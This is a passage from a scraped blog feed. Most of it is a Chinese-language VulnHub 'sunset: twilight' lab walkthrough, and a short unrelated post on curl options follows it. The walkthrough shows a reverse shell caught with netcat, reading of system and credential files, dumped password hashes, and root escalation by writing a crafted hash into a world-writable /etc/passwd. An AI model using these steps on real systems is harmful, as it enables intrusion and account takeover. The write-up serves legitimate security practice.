class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_twilight]<br>└─$ sudo nc -lvnp 443 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.133] 49904<br>Linux twilight 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br> 21:55:35 up 12:25,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.01, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ id</span><br><span class="hljs-string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:64:77:9f brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.133/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 433sec preferred_lft 433sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe64:779f/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux twilight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">/usr/bin/python</span><br><span class="hljs-string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@twilight:/$</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试访问 home 目录，依然无法访问 miguel 家目录，进行基础的信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@twilight:/var/www/html/gallery$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br></code></pre></td></tr></table></figure><p>定时任务没有收获</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@twilight:/var/www/html/gallery$ <span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin<br>miguel:x:1000:1000:,,,:/home/miguel:/bin/bash<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin<br>Debian-exim:x:107:115::/var/spool/exim4:/usr/sbin/nologin<br>mysql:x:108:118:MySQL Server,,,:/nonexistent:/bin/false<br></code></pre></td></tr></table></figure><p>passwd 刚才就通过本地文件包含读取了，并没有密码和更多信息存在。</p><p>SUID 文件呢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@twilight:/var/www/html/gallery$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>&lt;allery$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>   146212   1156 -rwsr-xr-x   1 root     root      1181384 May 13  2020 /usr/sbin/exim4<br>   131131     56 -rwsr-xr-x   1 root     root        54096 Jul 27  2018 /usr/bin/chfn<br>   131136     64 -rwsr-xr-x   1 root     root        63736 Jul 27  2018 /usr/bin/passwd<br>   131134     84 -rwsr-xr-x   1 root     root        84016 Jul 27  2018 /usr/bin/gpasswd<br>   131132     44 -rwsr-xr-x   1 root     root        44528 Jul 27  2018 /usr/bin/chsh<br>   135085     36 -rwsr-xr-x   1 root     root        34888 Jan 10  2019 /usr/bin/umount<br>   135083     52 -rwsr-xr-x   1 root     root        51280 Jan 10  2019 /usr/bin/mount<br>   145984    156 -rwsr-xr-x   1 root     root       157192 Feb  2  2020 /usr/bin/sudo<br>   134602     44 -rwsr-xr-x   1 root     root        44440 Jul 27  2018 /usr/bin/newgrp<br>   134749     64 -rwsr-xr-x   1 root     root        63568 Jan 10  2019 /usr/bin/su<br>   135376     52 -rwsr-xr--   1 root     messagebus    51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   145807    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign<br>   268427     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br>   277300     12 -rwsrwxrwx   1 www-data www-data      10854 Dec 28  2010 /var/www/html/gallery/maxImageUpload.zip<br>   277312      4 -rwsrwxrwx   1 www-data www-data        534 Mar 19  2008 /var/www/html/gallery/readme.txt<br>   277308      4 -rwsrwxrwx   1 root     root           1286 Nov 27  2007 /var/www/html/gallery/style/images/ok.gif<br>   277304      4 -rwsrwxrwx   1 root     root            455 Nov 27  2007 /var/www/html/gallery/style/images/header_bg.gif<br>   277306      4 -rwsrwxrwx   1 root     root            579 Nov 27  2007 /var/www/html/gallery/style/images/header_right.gif<br>   277303      4 -rwsrwxrwx   1 root     root            511 Nov 27  2007 /var/www/html/gallery/style/images/button.gif<br>   277305      4 -rwsrwxrwx   1 root     root           1581 Nov 27  2007 /var/www/html/gallery/style/images/header_left.gif<br>   277307      4 -rwsrwxrwx   1 root     root           1333 Nov 27  2007 /var/www/html/gallery/style/images/nok.gif<br>   277309      4 -rwsrwxrwx   1 root     root           3191 Nov 27  2007 /var/www/html/gallery/style/style.css<br>   277310     12 -rwsrwxrwx   1 www-data www-data       8916 Mar 19  2008 /var/www/html/gallery/maxImageUpload.class.php<br>   277311      4 -rwsrwxrwx   1 www-data www-data        601 Mar 18  2008 /var/www/html/gallery/index.php<br></code></pre></td></tr></table></figure><p>看到其中有 SUID 文件甚至是所有人都可读可写可执行，尝试修改将 <code>/bin/bash</code> 写入进去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@twilight:/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash&#x27;</span>&gt; /var/www/html/gallery/style/style.css<br>&lt; <span class="hljs-string">&#x27;/bin/bash&#x27;</span>&gt; /var/www/html/gallery/style/style.css<br>www-data@twilight:/tmp$ <span class="hljs-built_in">ls</span> -alih /var/www/html/gallery/style/style.css <br><span class="hljs-built_in">ls</span> -alih /var/www/html/gallery/style/style.css<br>277309 -rwxrwxrwx 1 root root 10 Aug  3 23:26 /var/www/html/gallery/style/style.css<br></code></pre></td></tr></table></figure><p>遇到了非常奇怪的事情，SUID 文件的 S 权限消失了，问了问 chatgpt</p><p><img src="/pic/362b8c48e71ab40e78978d04df173b9e_MD5.png"></p><p>还是没搞清楚，又拿了个文件进行上述操作，发现 SUID 依然会消失，那就只能再找别的攻击路径</p><p>尝试 MySQL 无密码登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_twilight]<br>└─$ mysql -u root -h 192.168.56.133 -p<br>Enter password: <br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection <span class="hljs-built_in">id</span> is 55<br>Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type <span class="hljs-string">&#x27;help;&#x27;</span> or <span class="hljs-string">&#x27;\h&#x27;</span> <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>. Type <span class="hljs-string">&#x27;\c&#x27;</span> to clear the current input statement.<br><br>MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>+--------------------+<br>3 rows <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br></code></pre></td></tr></table></figure><p>其中没有感兴趣的库。尝试 ftp 匿名登陆，但是的确只有那一个文件，下载后打开</p><p><img src="/pic/2561687834c115fb0ebda498b60b6c5f_MD5.png"></p><p>好像是乱码，不太像有效字符，先搁置吧</p><p>接下来在各处翻了翻文件，还是没思路，使用 linpeas 来辅助信息收集</p><p>我将感兴趣的信息整理到下面</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">Sudo</span> version <span class="hljs-number">1.8</span>.<span class="hljs-number">27</span><br><br>[<span class="hljs-type">CVE</span><span class="hljs-operator">-</span><span class="hljs-number">2019</span><span class="hljs-operator">-</span><span class="hljs-number">13272</span>] <span class="hljs-type">PTRACE_TRACEME</span><br><span class="hljs-type">Exposure</span>: highly probable<br><br><span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>crontab<br><span class="hljs-meta">@reboot</span> <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>php <span class="hljs-operator">-</span><span class="hljs-type">S</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span> <span class="hljs-operator">-</span>t <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>efs<br><span class="hljs-meta">@reboot</span> <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>python <span class="hljs-operator">-</span>m pyftpdlib <span class="hljs-operator">-</span>w <span class="hljs-operator">-</span>p <span class="hljs-number">2121</span> <span class="hljs-operator">-</span>d <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>ftp<br><br><br><span class="hljs-type">Do</span> not forget to test &#x27;su&#x27; <span class="hljs-keyword">as</span> <span class="hljs-keyword">any</span> other user with shell: without password and with their names <span class="hljs-keyword">as</span> password (<span class="hljs-type">I</span> don&#x27;t <span class="hljs-keyword">do</span> it <span class="hljs-keyword">in</span> <span class="hljs-type">FAST</span> mode<span class="hljs-operator">...</span>) <br><br><span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>samba<span class="hljs-operator">/</span><span class="hljs-keyword">private</span><span class="hljs-operator">/</span>secrets.tdb<br><br>passwd file: <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>pam.d<span class="hljs-operator">/</span>passwd                                         <br>passwd file: <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>lintian<span class="hljs-operator">/</span>overrides<span class="hljs-operator">/</span>passwd<br><br><span class="hljs-operator">-</span>rw<span class="hljs-operator">-</span>r<span class="hljs-operator">--</span>r<span class="hljs-operator">--</span> <span class="hljs-number">1</span> root root <span class="hljs-number">69</span> <span class="hljs-type">Jul</span>  <span class="hljs-number">5</span>  <span class="hljs-number">2020</span> <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>php<span class="hljs-operator">/</span><span class="hljs-number">7.3</span><span class="hljs-operator">/</span>mods<span class="hljs-operator">-</span>available<span class="hljs-operator">/</span>ftp.ini<br><span class="hljs-operator">-</span>rw<span class="hljs-operator">-</span>r<span class="hljs-operator">--</span>r<span class="hljs-operator">--</span> <span class="hljs-number">1</span> root root <span class="hljs-number">69</span> <span class="hljs-type">Jul</span>  <span class="hljs-number">5</span>  <span class="hljs-number">2020</span> <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>share<span class="hljs-operator">/</span>php7.<span class="hljs-number">3</span><span class="hljs-operator">-</span>common<span class="hljs-operator">/</span>common<span class="hljs-operator">/</span>ftp.ini<br><br><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd <span class="hljs-keyword">is</span> writable<br><br>root:<span class="hljs-variable">$6</span><span class="hljs-variable">$ToxjigfMAQqy04Ju</span><span class="hljs-variable">$KWxn7uPKThd8Aq7DDzmc4UP9</span><span class="hljs-operator">/</span>s70E1NF3ouxchGaEsmYF7mekSHrD.ffKkGjLC1gp1nkfq<span class="hljs-operator">/</span><span class="hljs-type">Z1</span>.<span class="hljs-type">O2tH12SehhM1</span>:<span class="hljs-number">18451</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br>miguel:<span class="hljs-variable">$6</span><span class="hljs-variable">$B45OA9E8qgti4kkO</span><span class="hljs-variable">$d8d7szJSGY9x5x5tSzyggQkKK0Zx</span>.dEksrxg33JcFGJqW2S1K9lQlhU56Q4Y3RI9<span class="hljs-operator">/</span>m4Gra78Cidi1C6dqvJpe1:<span class="hljs-number">18451</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::<br></code></pre></td></tr></table></figure><p>一开始我没有注意到 passwd 文件可写的情况，而是盯着 shadow 哈希，使用 john 破解的结果是用户名和密码一致，但是使用 ssh 登录和 su 命令都提示密码错误</p><p><img src="/pic/9e81f7576774c13c39bdfcbca4b24f38_MD5.png"></p><p><img src="/pic/329ba8c2c0d65598a32e6063200d052a_MD5.png"></p><p>我又试了以下直接读取 shadow 文件发现并没有成功，提示没有权限，不知道 linpeas 是怎么拿到的哈希值。</p><h3 id="可写-passwd-提权"><a href="#可写-passwd-提权" class="headerlink" title="可写 passwd 提权"></a>可写 passwd 提权</h3><p>反复查看 linpeas 的输出，终于发现了 passwd 可写的提示，那我们可以本地生成密码哈希，然后写入到 passwd 文件中</p><p>先备份已有的 passwd 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@twilight:/tmp$ <span class="hljs-built_in">cp</span> /etc/passwd /tmp/passwd.bak<br><span class="hljs-built_in">cp</span> /etc/passwd /tmp/passwd.bak<br></code></pre></td></tr></table></figure><p>使用 <code>openssl</code> 命令生成密码哈希</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@twilight:/tmp$ openssl passwd 123456      <br>openssl passwd 123456<br>5vz6eychoQ1Vc<br></code></pre></td></tr></table></figure><p>可以构造出 <code>root:5vz6eychoQ1Vc:0:0:root:/root:/bin/bash</code> 但由于交互性比较差，编辑错了一次，幸好备份，正好用上了，写入使用 <code>su root</code> 输入设定的 <code>123456</code> 密码登录成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@twilight:/tmp$ su root<br>su root<br>Password: 123456<br><br>root@twilight:/tmp<span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br>root@twilight:/tmp<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@twilight:/tmp<span class="hljs-comment"># ip a</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:64:77:9f brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.133/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 373sec preferred_lft 373sec<br>    inet6 fe80::a00:27ff:fe64:779f/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@twilight:/tmp<span class="hljs-comment"># uname -a</span><br><span class="hljs-built_in">uname</span> -a<br>Linux twilight 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><p>拿一下 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@twilight:~<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>root.txt<br>root@twilight:~<span class="hljs-comment"># cat root.txt</span><br><span class="hljs-built_in">cat</span> root.txt<br>(\ <br>\<span class="hljs-string">&#x27;\ </span><br><span class="hljs-string"> \&#x27;</span>\     __________  <br> / <span class="hljs-string">&#x27;|   ()_________)</span><br><span class="hljs-string"> \ &#x27;</span>/    \ ~~~~~~~~ \<br>   \       \ ~~~~~~   \<br>   ==).      \__________\<br>  (__)       ()__________)<br><br><br>34d3ecb1bbd092bcb87954cee55d88d3<br><br>Thanks <span class="hljs-keyword">for</span> playing! - Felipe Winsnes (@whitecr0wz)<br>root@twilight:~<span class="hljs-comment"># cd /home/</span><br><span class="hljs-built_in">cd</span> /home/<br>root@twilight:/home<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>miguel<br>root@twilight:/home<span class="hljs-comment"># cd miguel</span><br><span class="hljs-built_in">cd</span> miguel<br>root@twilight:/home/miguel<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>efs  efs2  ftp  user.txt<br>root@twilight:/home/miguel<span class="hljs-comment"># cat user.txt</span><br><span class="hljs-built_in">cat</span> user.txt<br>6b963e69f7b4a6205513973e4cace702<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>curl 常用命令</title>
    <link href="/2023/08/e2811ca40453.html"/>
    <url>/2023/08/e2811ca40453.html</url>
    
    <content type="html"><![CDATA[<h1 id="curl-常用命令"><a href="#curl-常用命令" class="headerlink" title="curl 常用命令"></a>curl 常用命令</h1><h2 id="A"><a href="#A" class="headerlink" title="-A"></a>-A</h2><p><code>-A</code>参数指定客户端的用户代理标头，即<code>User-Agent</code>。curl 的默认用户代理字符串是<code>curl/[version]</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -A <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27;</span> https://google.com<br></code></pre></td></tr></table></figure><p>也可以通过-H 参数直接指定标头，更改 User-Agent。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&#x27;User-Agent: php/1.0&#x27;</span> https://google.com<br></code></pre></td></tr></table></figure><h2 id="b"><a href="#b" class="headerlink" title="-b"></a>-b</h2><p><code>-b</code> 参数用来向服务器发送 Cookie，可以指定也可以读取本地文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -b <span class="hljs-string">&#x27;foo1=bar;foo2=bar2&#x27;</span> https://google.com<br></code></pre></td></tr></table></figure><h2 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h2><p><code>-c</code> 参数将服务器设置的 Cookie 写入一个文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -c cookies.txt https://www.google.com<br></code></pre></td></tr></table></figure><h2 id="d"><a href="#d" class="headerlink" title="-d"></a>-d</h2><p><code>-d</code> 参数用于发送 POST 请求的数据体。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d<span class="hljs-string">&#x27;login=emma＆password=123&#x27;</span>-X POST https://google.com/login<br></code></pre></td></tr></table></figure><p>使用 <code>-d</code> 参数以后，HTTP 请求会自动加上标头 <code>Content-Type : application/x-www-form-urlencoded</code>。并且会自动将请求转为 POST 方法，因此可以省略 <code>-X POST</code>。</p><p><code>-d</code> 参数可以读取本地文本文件的数据，向服务器发送。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -d <span class="hljs-string">&#x27;@data.txt&#x27;</span> https://google.com/login<br></code></pre></td></tr></table></figure><h2 id="–data-urlencode"><a href="#–data-urlencode" class="headerlink" title="–data-urlencode"></a>–data-urlencode</h2><p><code>--data-urlencode</code> 参数等同于 <code>-d</code>，发送 POST 请求的数据体，区别在于会自动将发送的数据进行 URL 编码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 